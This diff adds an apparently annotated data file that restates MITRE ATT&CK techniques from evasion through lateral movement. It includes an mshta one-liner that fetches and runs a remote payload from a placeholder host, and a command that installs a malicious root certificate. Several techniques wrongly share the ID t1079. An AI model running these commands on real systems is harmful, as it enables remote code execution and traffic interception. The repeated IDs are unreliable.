@@ -1,0 +1,572 @@
+
+
+<tactic> defense evasion, execution<\tactic>
+<techniquename> mshta<\techniquename>
+<id> t1170<\id>
+
+
+adversaries can  use   mshta.exe  to  proxy  execution   of malicious  .hta files  and  javascript  or  vbscript   through a  trusted windows utility .
+ files  may be  executed  by  mshta.exe through an inline script: mshta vbscript:close(execute("getobject(""script:https //webserver/payload[.
+]sct"")")) 
+ they(files)  may also be  executed  directly from  urls: mshta http //webserver/payload[.
+]hta 
+ mshta.exe  can be  used  to   bypass   application whitelisting solutions    that do not account for its potential use.
+since mshta.exe executes outside of the internet explorer's security context, it also   bypasses   browser security settings  .
+
+
+<tactic> defense evasion<\tactic>
+<techniquename> modify registry<\techniquename>
+<id> t1112<\id>
+
+
+adversaries may  interact  with the  windows registry  to   hide    configuration information  within registry keys ,   remove   information  as part of cleaning up , or as part of other techniques to  aid in persistence and execution .
+ access to specific areas of the registry depends on  account permissions , some requiring  administrator-level access  .
+the  built-in windows command-line utility reg  may be  used  for  local or remote registry modification .
+  other tools may also be  used , such as a  remote access tool , which may contain functionality to   interact  with the  registry    through the  windows api   (see examples).
+ registry   modifications  may also include actions to   hide   keys  , such as   prepending   key names  with a  null character  , which will cause an error and/or be ignored when read via reg or other utilities using the win32 api.
+the  registry  of a  remote system  may be  modified  to  aid in execution of files as part of lateral movement .
+ it requires the   remote registry service  to be running on the target system   .
+  often   valid accounts  are required, along with  access to the remote system's windows admin shares  for rpc communication .
+
+
+<tactic> defense evasion<\tactic>
+<techniquename> masquerading<\techniquename>
+<id> t1036<\id>
+
+
+masquerading occurs when the  name of an executable   or   location of an executable  , legitimate or malicious, is  manipulated  or abused for the sake of  evading defenses  and observation.
+ one variant is for an  executable  to be  placed  in a  commonly trusted directory  or  given  the name of a legitimate, trusted program .
+an example of this is when a   common system utility  or  program  is  moved  and  renamed  to  avoid detection based on its usage  .
+  this is done to   bypass   tools  that trust executables by relying on file name or path , as well as to   deceive   defenders  and  system administrators  into thinking a file is benign by associating the name with something that is thought to be legitimate .
+a third variant  uses  the  right-to-left override (rtlo or rlo) character (u+202e)   as a  means of  tricking  a  user  into executing what they think is a benign file type but is actually executable code .
+in another variation of this technique, an adversary may use a  renamed  copy of a  legitimate utility , such as rundll32.exe.
+  an alternative case occurs when a  legitimate utility  is  moved  to a  different directory  and also  renamed  to  avoid detections  based on system utilities executing from non-standard paths.
+another variation of this technique includes malicious binaries  changing  the  name of their running process  to that of a  trusted or benign process , after they have been launched as opposed to before.
+
+
+<tactic> defense evasion<\tactic>
+<techniquename> lc_main hijacking<\techniquename>
+<id> t1149<\id>
+
+
+as of os x 10.8, mach-o binaries introduced a new header called  lc_main  that points to the binary’s entry point for execution.
+previously, there were two headers to achieve this same effect:  lc_thread  and  lc_unixthread   .
+the  entry point for a binary  can be  hijacked  so that  initial execution  flows  to a malicious addition  (either another section or a code cave) and then goes back to the initial entry point so that the victim doesn’t know anything was different  .
+by   modifying  a  binary  in this(lc_main hijacking) way ,   application whitelisting  can be  bypassed   because the file name or application path is still the same.
+
+
+<tactic> defense evasion, execution, persistence<\tactic>
+<techniquename> launchctl<\techniquename>
+<id> t1152<\id>
+
+
+by   loading  or  reloading   launch agents  or  launch daemons  , adversaries can  install   persistence or  execute   changes(code)  they made  .
+running a command from launchctl is as simple as  launchctl submit -l -- /path/to/thing/to/execute "arg" "arg" "arg" .
+ loading, unloading, or reloading  launch agents  or  launch daemons  can  require elevated privileges  .
+adversaries can  abuse   this functionality(launchctl)  to   execute   code   or even   bypass    whitelisting   if    launchctl  is an allowed process  .
+
+
+<tactic> defense evasion, execution <\tactic>
+<techniquename> installutil<\techniquename>
+<id> t1118<\id>
+
+
+adversaries may  use   installutil  to  proxy  execution  of  code   through a  trusted windows utility .
+ installutil  may also be  used  to   bypass   process whitelisting   through   use  of  attributes  within the binary  that execute the class decorated with the attribute   .
+
+
+<tactic> defense evasion <\tactic>
+<techniquename> install root certificate<\techniquename>
+<id> t1130<\id>
+
+
+ installation  of a  root certificate  on a compromised system would give an adversary a way to   degrade  the  security of that system  .
+adversaries have  used   this technique(install root certificate)  to  avoid security warnings prompting users  when  compromised systems  connect over https to adversary controlled web servers   that spoof legitimate websites in order to   collect   login credentials  .
+atypical  root certificates  have also been pre-installed on systems by the manufacturer or in the software supply chain and were  used  in conjunction with  malware/adware  to  provide a man-in-the-middle capabilityfor  intercepting   information  transmitted over secure tls/ssl communications .
+  root certificates  (and their associated chains) can also be  cloned  and  reinstalled .
+ cloned certificate  chains will carry many of the same metadata characteristics of the source and can be  used  to   sign  malicious  code   that may then    bypass   signature validation tools  (ex:  sysinternals ,  antivirus , etc.)
+ used to block execution and/or uncover artifacts of persistence .
+in macos, the ay mami malware  uses   /usr/bin/security add-trusted-cert -d -r trustroot -k /library/keychains/system.keychain /path/to/malicious/cert  to   install  a malicious  certificate   as a trusted root certificate into the system keychain.
+
+
+<tactic> credential access<\tactic>
+<techniquename> two-factor authentication interception<\techniquename>
+<id> t1111<\id>
+
+
+use of two- or multifactor authentication is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to   intercept  and  bypass  these  security mechanisms  .
+adversaries may target authentication mechanisms, such as smart cards, to   gain access  to  systems ,  services , and  network resources  .
+if a    smart card  is used for two-factor authentication (2fa)    , then a  keylogger  will need to be  used  to   obtain  the  password  associated with a smart card  during normal use.
+with both  an   inserted card  and access to the smart card  password   , an adversary can  connect  to a  network resource    using  the  infected system   to   proxy  the  authentication  with the inserted hardware token .
+adversaries may also  employ  a  keylogger  to similarly target other hardware tokens, such as rsa securid.
+ capturing   token input  (including a user's personal identification code) may  provide temporary access  (i.e.
+replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably   predict  future  authentication values   (given access to both the algorithm and any seed values used to generate appended temporary codes) .
+
+
+<tactic> credential access<\tactic>
+<techniquename> securityd memory<\techniquename>
+<id> t1167<\id>
+
+
+if an  adversary can  obtain  root access    (allowing them to read securityd’s memory), then they can  scan  through  memory  to   find  the correct sequence of  keys   in relatively few tries to decrypt the user’s logon keychain.
+
+
+<tactic> credential access<\tactic>
+<techniquename> private keys<\techniquename>
+<id> t1145<\id>
+
+
+adversaries may  gather   private keys  from compromised systems for  use in authenticating to remote services like ssh  or for  use in decrypting other collected files such as email .
+adversaries may also  look  in common key  directories , such as  ~/.ssh  for ssh keys on * nix-based systems or  c:\users(username).ssh\  on windows.
+private keys should require a password or passphrase for operation, so an adversary may also  use   input capture  for  keylogging  or  attempt  to  brute force  the passphrase off-line.
+
+
+<tactic> credential access<\tactic>
+<techniquename> password filter dll<\techniquename>
+<id> t1174<\id>
+
+
+adversaries can  register  malicious  password filters  to   harvest   credentials  from local computers and/or entire domains .
+to perform proper validation,   filters must receive  plain-text credentials   from the lsa .
+
+
+<tactic> credential access , discovery<\tactic>
+<techniquename> network sniffing<\techniquename>
+<id> t1040<\id>
+
+
+an adversary may  place  a  network interface  into  promiscuous mode  to  passively  access   data  in transit over the network , or  use   span ports  to   capture  a larger amount of  data  .
+ techniques for name service resolution poisoning , such as  llmnr/nbt-ns poisoning and relay , can also be  used  to   capture   credentials   to websites, proxies, and internal systems by redirecting traffic to an adversary.
+
+
+<tactic> credential access<\tactic>
+<techniquename> llmnr/nbt-ns poisoning and relay<\techniquename>
+<id> t1171<\id>
+
+
+adversaries can  spoof  an  authoritative source  for  name resolution  on a victim network by   responding  to  llmnr (udp 5355)/nbt-ns (udp 137) traffic   as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system.  if the   requested host  belongs to a resource that  requires identification/authentication   , the  username  and  ntlmv2 hash  will then be  sent  to the adversary controlled system.
+the adversary can then  collect  the  hash information  sent over the wire through  tools that monitor the ports for traffic  or through  network sniffing  and  crack  the  hashes  offline through  brute force  to   obtain  the plaintext  passwords   .
+in some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the  ntlmv2 hashes  can be  intercepted  and  relayed  to   access  and  execute   code   against a target system.
+several  tools  exist that can be  used  to   poison   name services   within local networks such as  nbnspoof ,  metasploit , and  responder .
+
+
+<tactic> credential access<\tactic>
+<techniquename> keychain<\techniquename>
+<id> t1142<\id>
+
+
+if an  adversary  knows the  credentials  for the login keychain  , then they can get access to all the other credentials stored in this vault.
+
+
+<tactic> credential access<\tactic>
+<techniquename> kerberoasting<\techniquename>
+<id> t1208<\id>
+
+
+adversaries possessing a valid kerberos ticket-granting ticket (tgt) may  request  one or more  kerberos ticket-granting service (tgs) service tickets  for any spn from a domain controller (dc).
+    portions of these tickets may be encrypted with the rc4 algorithm, meaning the kerberos 5 tgs-rep etype 23 hash of the service account associated with the spn is used as the private key and is thus vulnerable to offline  brute force attacks  that may   expose  plaintext  credentials  .
+this same  attack  could be  executed    using   service tickets  captured from network traffic .
+ cracked   hashes  may  enable persistence, privilege escalation, and lateral movement  via  access to valid accounts .
+
+
+<tactic> credential access<\tactic>
+<techniquename> input prompt<\techniquename>
+<id> t1141<\id>
+
+
+adversaries may  mimic  this  functionality(input prompt)   to   prompt   users  for credentials  with a  seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a  fake installer requiring additional access  or a  fake malware removal suite .
+  this type of  prompt  can be  used  to   collect   credentials   via various languages such as  applescript     and  powershell    .
+
+
+<tactic> discovery<\tactic>
+<techniquename> system time discovery<\techniquename>
+<id> t1124<\id>
+
+
+an adversary may  gather  the  system time  and/or  time zone  from a local or remote system.
+this information may be gathered in a number of ways, such as with net on windows by  performing net time \hostname  to gather the system time on a remote system.
+the victim's  time zone  may also be  inferred  from the current system time or  gathered  by  using w32tm /tz .
+  the information could be useful for performing other techniques, such as   executing  a  file  with a scheduled task    , or to   discover   locality information  based on time zone  to assist in victim targeting.
+
+
+<tactic> discovery <\tactic>
+<techniquename> system service discovery<\techniquename>
+<id> t1007<\id>
+
+
+commands that may  obtain   information about services   using operating system utilities are "sc," "tasklist /svc" using tasklist , and  "net start" using net , but adversaries may also use other tools as well.
+
+
+<tactic> discovery <\tactic>
+<techniquename> system owner/user discovery<\techniquename>
+<id> t1033<\id>
+
+
+adversaries may attempt to  identify  the  primary user ,  currently logged in user ,  set of users  that commonly uses a system, or whether a user is actively using the system.
+they may do this, for example, by   retrieving   account usernames   or by   using   credential dumping  .
+on mac, the  currently logged in   user  can be  identified  with  users , w , and  who .
+on linux, the  currently logged in   user  can be  identified  with  w  and  who .
+
+
+<tactic> discovery <\tactic>
+<techniquename> system network connections discovery <\techniquename>
+<id> t1049<\id>
+
+
+adversaries may attempt to  get  a  listing of network connections  to or from the compromised system they are currently accessing or from remote systems by   querying  for  information  over the network .
+utilities and commands that acquire this information include  netstat, "net use," and "net session" with net .
+in mac and linux,  netstat  and  lsof  can be  used  to   list  current  connections  .
+
+
+<tactic> discovery <\tactic>
+<techniquename> system network configuration discovery<\techniquename>
+<id> t1016<\id>
+
+
+several operating system  administration utilities  exist that can be  used  to   gather  this  information  .
+examples include  arp ,  ipconfig/ifconfig ,  nbtstat , and  route .
+
+
+<tactic> discovery <\tactic>
+<techniquename> system information discovery<\techniquename>
+<id> t1082<\id>
+
+
+an adversary may attempt to   get  detailed  information  about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture .
+example commands and utilities that  obtain  this  information  include  ver ,  systeminfo , and  dir  within cmd for   identifying   information  based on present files and directories .
+
+
+<tactic> discovery <\tactic>
+<techniquename> security software discovery<\techniquename>
+<id> t1063<\id>
+
+
+adversaries may attempt to  get a listing  of  security software ,   configurations ,   defensive tools , and   sensors   that are installed on the system.
+example  commands  that can be  used  to   obtain   security software information   are  netsh, reg query with reg ,  dir with cmd , and  tasklist , but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.
+
+
+<tactic> discovery <\tactic>
+<techniquename> remote system discovery<\techniquename>
+<id> t1018<\id>
+
+
+adversaries will likely attempt to  get a listing   of other  systems  by  ip address, hostname, or other logical identifier  on a networkthat may be used for lateral movement from the current system.
+adversaries may also  use   local host files  in order to   discover  the  hostname to ip address mappings  of remote systems .
+examples of tools and commands that  acquire  this  information  include "ping" or "net view"  using net .
+the contents of the  c:\windows\system32\drivers\etc\hosts file  can be  viewed  to   gain insight  into the existing  hostname to ip mappings  on the system .
+ utilities  such as  "ping"  and others can be  used  to   gather   information about remote systems  .
+the contents of the  /etc/hosts file  can be  viewed  to   gain insight  into existing  hostname to ip mappings  on the system .
+ utilities  such as  "ping"  and others can be  used  to   gather   information about remote systems  .
+the contents of the  /etc/hosts file  can be  viewed  to   gain insight   into existing  hostname to ip mappings  on the system .
+
+
+<tactic> discovery <\tactic>
+<techniquename> query registry<\techniquename>
+<id> t1012<\id>
+
+
+adversaries may  interact  with the  windows registry  to   gather   information  about the system, configuration, and installed software .
+
+
+<tactic> discovery <\tactic>
+<techniquename> process discovery<\techniquename>
+<id> t1057<\id>
+
+
+adversaries may attempt to   get   information  about running processes on a system .
+information obtained could be used to   gain  an  understanding of common software running on systems  within the network .
+an example command that would  obtain   details on processes  is "tasklist"  using the tasklist utility .
+
+
+<tactic>command and control<\tactic>
+<techniquename> multi-stage channels<\techniquename>
+<id> t1104 <\id>
+
+
+adversaries may  create   multiple stages  for command and control that are employed under different conditions or for certain functions.
+ use of multiple stages  may  obfuscate  the  command and control channel  to  make detection more difficult .
+  remote access tools  will  call back  to the  first-stage   command and control server  for  instructions .
+the first stage may have automated capabilities to  collect basic host information, update tools, and upload additional files .
+a second  remote access tool (rat)   could be  uploaded  at that point to  redirect the host to the second-stage command and control server .
+the second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional rat features .
+
+
+<tactic>command and control<\tactic>
+<techniquename>web service<\techniquename>
+<id> t1102 <\id>
+
+
+adversaries may  use  an  existing, legitimate external web service  as a means for  relaying commands to a compromised system .
+adversaries may  post content, known as a dead drop resolver on web services with embedded (and often obfuscated/encoded) domains or ip addresses .
+ once  infected  , victims will reach out to and be redirected by these resolvers.
+ using   common services, such as those offered by google or twitter , makes it easier for adversaries to  hide in expected noise .
+
+
+<tactic>command and control<\tactic>
+<techniquename> uncommonly used port<\techniquename>
+<id> t1065 <\id>
+
+
+adversaries may  conduct   c2 communications  over a  non-standard port  to   bypass   proxies  and  firewalls    that have been  improperly configured  .
+
+
+<tactic>command and control<\tactic>
+<techniquename> standard non-application layer protocol<\techniquename>
+<id> t1095 <\id>
+
+
+ use of a standard non-application layer protocol  for  communication(communicate)  between  host and c2 server or among infected hosts  within a network.
+  specific examples include  use of network layer protocols, such as the internet control message protocol (icmp)   , transport layer protocols, such as the user datagram protocol (udp)  ,  ,session layer protocols, such as socket secure (socks)  , as well as  redirected/tunneled protocols, such as serial over lan (sol)  .
+because icmp is part of the internet protocol suite, it is required to be implemented by all ip-compatible hosts;   however, it is   not as commonly monitored  as other  internet protocols such as tcp or udp   and may be used by adversaries to  hide communications .
+
+
+<tactic>command and control<\tactic>
+<techniquename> standard cryptographic protocol<\techniquename>
+<id> t1032 <\id>
+
+
+adversaries may explicitly  employ  a known  encryption algorithm  to  conceal  command and control traffic   rather than relying on any inherent protections provided by a communication protocol.
+
+
+<tactic>command and control<\tactic>
+<techniquename> standard application layer protocol<\techniquename>
+<id> t1071 <\id>
+
+
+adversaries may communicate  using a common, standardized application layer protocol   such as   using  http ,   using  https ,   using  smtp , or   using  dns  to  avoid detection  by  blending  in with  existing traffic .
+commands to the remote system, and often the results of those commands, will be  embedded  within the  protocol traffic  between the client and server.
+
+
+<tactic>command and control<\tactic>
+<techniquename> remote file copy<\techniquename>
+<id> t1105 <\id>
+
+
+ files  may be  copied  from one system to another to  stage adversary tools or other files  over the course of an operation.
+ files  may be  copied   from an external adversary-controlled system through the  command and control channel  to  bring tools into the victim network  or through  alternate protocols with another tool  such as  ftp .
+ files  can also be  copied  over on  mac and linux with native tools  like  scp ,  rsync , and  sftp .
+adversaries may also  copy    files   laterally between internal victim systems to support lateral movement with  remote execution using inherent file sharing protocols such as file sharing over smb  to connected network shares or with  authenticated connections with windows admin shares  or  remote desktop protocol .
+
+
+<tactic>command and control<\tactic>
+<techniquename> remote access tools<\techniquename>
+<id> t1079 <\id>
+
+
+an adversary may  use  legitimate  desktop support and remote access software , such as  team viewer ,  go2assist ,  logmein ,  , ammyyadmin ammyyadmin  , etc, to  establish an interactive command and control channel  to target systems within networks.
+these services are commonly  used as  legitimate technical support software , and may be  whitelisted  within a target environment .
+remote access tools may be  established  and  used  post-compromise as alternate  communications channel  for  redundant access  or as a way to  establish an interactive remote desktop session  with the target system.
+they may also be used as a component of malware to  establish a reverse connection  or  back-connect to a service or adversary controlled system .
+
+
+<tactic> defense evasion, persistence, command and control<\tactic>
+<techniquename> port knocking<\techniquename>
+<id> t1205 <\id>
+
+
+ port knocking  is a well-established method  used  by both defenders and adversaries to  hide open ports from access .
+to  enable a port , an adversary  sends  a series of  packets  with certain characteristics before the port will be opened.
+usually this series of packets consists of  attempted connections to a predefined sequence of closed ports , but can involve  unusual flags ,  specific strings  or other unique characteristics.
+
+
+<tactic>command and control<\tactic>
+<techniquename> multilayer encryption<\techniquename>
+<id> t1079 <\id>
+
+
+an adversary  performs   c2 communications   using multiple layers of encryption , typically (but not exclusively)  tunneling a custom encryption scheme within a protocol encryption scheme  such as https or smtps.
+
+
+<tactic>command and control<\tactic>
+<techniquename> multiband communication<\techniquename>
+<id> t1079 <\id>
+
+
+some adversaries may  split   communications  between different protocols.
+there could be one protocol for inbound command and control and another for outbound data, allowing it to   bypass  certain  firewall restrictions  .
+the split could also be random to simply   avoid   data threshold alerts  on any one communication .
+
+
+<tactic> exfiltration<\tactic>
+<techniquename> scheduled transfer<\techniquename>
+<id> t1079 <\id>
+
+
+ data   exfiltration  may be performed only at  certain times of day  or at  certain intervals .
+this could be done to  blend traffic patterns with normal activity  or availability
+when scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as  exfiltration over command and control channel  and  exfiltration over alternative protocol .
+
+
+<tactic> exfiltration<\tactic>
+<techniquename> exfiltration over physical medium<\techniquename>
+<id> t1052 <\id>
+
+
+in certain circumstances, such as an air-gapped network compromise,  exfiltration  could occur via a  physical medium or device introduced by a user .
+such media could be an  external hard drive ,  usb drive ,  cellular phone ,  mp3 player , or other removable storage and processing device.
+
+
+<tactic> exfiltration <\tactic>
+<techniquename> exfiltration over other network medium<\techniquename>
+<id> t1011 <\id>
+
+
+if the command and control network is a wired internet connection, the  exfiltration  may occur, for example, over a  wifi connection ,  modem ,  cellular data connection ,  bluetooth , or another  radio frequency (rf) channel .
+adversaries could choose to do this if they have    sufficient access or proximity , and the  connection  might  not be secured or defended as well as the primary internet-connected channel   because it is not routed through the same enterprise network.
+
+
+<tactic> exfiltration<\tactic>
+<techniquename> exfiltration over command and control channel<\techniquename>
+<id> t1041 <\id>
+
+
+ data   exfiltration  is performed over the  command and control channel .
+ data  is  encoded  into the normal communications channel using the  same protocol as command and control communications .
+
+
+<tactic> collection<\tactic>
+<techniquename> video capture<\techniquename>
+<id> t1125 <\id>
+
+
+an adversary can  leverage  a computer's  peripheral devices  (e.g.,  integrated cameras  or  webcams ) or  applications  (e.g.,  video call services ) to  capture video recordings  for the purpose of  gathering information .
+ images  may also be  captured  from devices or applications, potentially in  specified intervals , in lieu of video files.
+ malware or scripts  may be  used  to interact with the devices through an  available api provided by the operating system or an application  to  capture video or images .
+ video  or  image files  may be  written  to disk and exfiltrated later.
+this technique differs from screen capture due to use of specific devices or applications for  video recording  rather than capturing the victim's screen.
+in macos, there are a few different malware samples that  record  the user's  webcam  such as fruitfly and proton.
+
+
+<tactic> collection<\tactic>
+<techniquename> screen capture<\techniquename>
+<id> t1113 <\id>
+
+
+adversaries may attempt to  take   screen captures  of the  desktop  to  gather information  over the course of an operation.
+on osx, the  native command screencapture  is  used  to  capture screenshots .
+
+
+<tactic> collection<\tactic>
+<techniquename> man in the browser <\techniquename>
+<id> t1185<\id>
+
+
+adversaries can  take advantage  of  security vulnerabilities  and  inherent functionality  in browser software to  change content, modify behavior, and intercept information  as part of various man in the browser techniques.
+a specific example is when an adversary  injects   software  into a  browser  that allows an them to  inherit cookies ,   inherit  http sessions , and   inherit ssl client certificates  of a user and  use the browser as a way to pivot into an authenticated intranet .
+ browser pivoting requires the  sedebugprivilege  and a  high-integrity  process  to execute  .
+ browser traffic  is  pivoted  from the adversary's browser through the user's browser by  setting up an http proxy  which will  redirect any http and https traffic .
+
+
+<tactic> collection<\tactic>
+<techniquename> input capture <\techniquename>
+<id> t1056<\id>
+
+
+adversaries can use methods of  capturing   user input  for  obtaining credentials  for valid accounts and information collection that include  keylogging  and  user input field interception .
+ keylogging  is the most prevalent type of input capture, with many different ways of  intercepting   keystrokes ,   but other methods exist to target information for specific purposes, such as  performing a uac prompt  or  wrapping the windows default credential provider .
+ keylogging  is likely to be used to  acquire   credentials  for  new access opportunities  when    credential  dumping efforts are not effective , and may require an   adversary  to remain passive on a system for a period of time   before an opportunity arises.
+adversaries may also  install   code  on  externally facing portals , such as a  vpn login page , to  capture and transmit credentials of users  who attempt to log into the service.
+this variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through  external remote services  and  valid accounts  or as part of the initial compromise by exploitation of the externally facing web service.
+
+
+<tactic> collection<\tactic>
+<techniquename> email collection<\techniquename>
+<id> t1114<\id>
+
+
+adversaries may  target   user email  to  collect sensitive information  from a target.
+ files  containing  email data  can be  acquired  from a user's system, such as  outlook storage  or  cache files .pst and .ost .
+ adversaries may  leverage  a user's  credentials  and  interact  directly with the  exchange server  to  acquire information  from within a network.
+ 
+some adversaries may  acquire   user credentials  and  access  externally facing  webmail applications , such as  outlook web access .
+
+
+<tactic> collection<\tactic>
+<techniquename> data staged<\techniquename>
+<id> t1074<\id>
+
+
+collected  data  is  staged  in a  central location or directory  prior to exfiltration.
+ data  may be  kept  in  separate files  or  combined  into  one file  through techniques such as  data compressed  or  data encrypted .
+interactive command shells may be used, and common functionality within cmd and bash may be used to  copy   data  into a  staging location .
+
+
+<tactic> execution, lateral movemnet<\tactic>
+<techniquename> windows remote management<\techniquename>
+<id> t1028<\id>
+
+
+windows remote management (winrm) is the name of both a windows service and a protocol that allows a user to interact with a remote system (e.g.,  run  an  executable ,  modify  the  registry ,  modify   services ).
+  it may be called with the  winrm command  or by any number of programs such as powershell.
+
+
+<tactic> lateral movemnet<\tactic>
+<techniquename> windows admin shares<\techniquename>
+<id> t1077<\id>
+
+
+adversaries may use this technique in conjunction with administrator-level valid accounts to remotely access a networked system over server message block (smb)   to interact with systems using remote procedure calls (rpcs),    transfer   files , and  run  transferred  binaries  through  remote execution .
+example execution techniques that rely on   authenticated  sessions    over smb/rpc are  scheduled task ,  service execution , and  windows management instrumentation .
+adversaries can also  use ntlm hashes  to  access   administrator shares  on systems with  pass the hash  and certain configuration and patch levels.
+the net utility can be used to  connect  to  windows admin shares  on remote systems using  net use commands  with   valid   credentials  .
+
+
+<tactic> execution, lateral movement <\tactic>
+<techniquename> third-party software<\techniquename>
+<id> t1072<\id>
+
+
+ if an adversary  gains access ,  to these  systems  then they may be able to  execute   code .
+  access to a network-wide or enterprise-wide   software deployment system   enables an adversary to have remote  code   execution  on all systems that are connected to such a system.
+the access may be used to  laterally move to systems ,  gather information , or cause a specific effect, such as  wiping the hard drives on all endpoints .
+the permissions required for this action vary by system configuration;   local credentials may be sufficient with direct access  to the  deployment server  , or   specific domain credentials may be required  .
+however,  the system may require an   administrative account  to log in or to perform software deployment  .
+
+
+<tactic> lateral movement <\tactic>
+<techniquename> taint shared content<\techniquename>
+<id> t1080<\id>
+
+
+content stored on network drives or in other  shared locations  may be  tainted  by   adding    malicious programs ,  scripts , or  exploit code   to otherwise valid files.
+ once a user  opens the shared tainted content  , the malicious portion can be executed to run the adversary's code on a remote system.
+adversaries may  use  tainted shared content to  move laterally .
+it   uses   shortcut modification of directory  .lnk files    that  use   masquerading   to look like the real directories, which are hidden   through   hidden files and directories .
+the malicious .lnk-based directories have an  embedded command  that  executes  the hidden  malware file  in the directory and then opens the real intended directory so that the user's expected action still occurs.
+
+
+<tactic> lateral movement <\tactic>
+<techniquename> ssh hijacking<\techniquename>
+<id> t1184<\id>
+
+
+in order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active ssh sessions by  hijacking  an  existing connection  to another system.
+this may occur through  compromising the ssh agent  itself or by  having access to the agent's socket .
+ if an adversary is able to  obtain root access   , then hijacking ssh sessions is likely trivial.
+
+
+<tactic> lateral movement <\tactic>
+<techniquename> shared webroot<\techniquename>
+<id> t1051<\id>
+
+
+ adversaries may  add  malicious  content  to an internally accessible website through an  open network file share   that  contains the website's webroot or web content directory       and then  browse  to that  content  with a  web browser  to cause the server to  execute the malicious content  .
+for example, a web server running php with an open network share could allow an adversary to  upload  a  remote access tool  and  php script  to  execute the rat on the system running the web server   when a  specific page   is visited .
+   
+
+
+<tactic> lateral movement, initial access <\tactic>
+<techniquename> replication through removable media<\techniquename>
+<id> t1091<\id>
+
+
+adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by  copying   malware  to  removable media  and  taking advantage  of  autorun features  when the   media  is  inserted into a system and executes  .
+in the case of lateral movement, this may occur through  modification  of  executable files  stored on  removable media  or by   copying   malware  and  renaming  it to look like a legitimate file to  trick users into executing it  on a separate system .
+
+
+<tactic> lateral movement <\tactic>
+<techniquename> remote services<\techniquename>
+<id> t1021<\id>
+
+
+an adversary may  use   valid accounts  to  log into a service  specifically designed to   accept remote  ,  connections  , such as telnet, ssh, and vnc.
